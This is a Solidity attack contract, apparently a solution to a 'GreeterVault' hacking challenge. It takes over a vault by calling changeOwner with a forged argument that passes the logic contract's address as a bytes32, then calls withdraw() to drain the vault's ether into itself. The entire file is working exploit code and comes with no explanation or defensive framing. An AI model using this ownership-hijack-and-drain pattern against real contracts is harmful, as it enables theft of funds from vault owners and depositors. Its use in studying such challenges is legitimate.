// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract greeterVaultAttack {
    receive() external payable {
      console.log("greeterVaultAttack---->receive:", msg.value);
    }

    function attack(address payable _vault, address _logic) public payable returns (bool ok) {
        console.log("greeterVaultAttack---->attack---->1");
        bytes memory changeOwnerSig = abi.encodeWithSignature("changeOwner(bytes32,address)", _logic, address(this));
        (bool changeOk,) = _vault.call(changeOwnerSig);
        require(changeOk, "change owner failed!!!");
        
        bytes memory withdrawSig = abi.encodeWithSignature("withdraw()", "");
        (ok,) = _vault.call(withdrawSig);
        console.log("greeterVaultAttack---->attack---->2");
    }
}
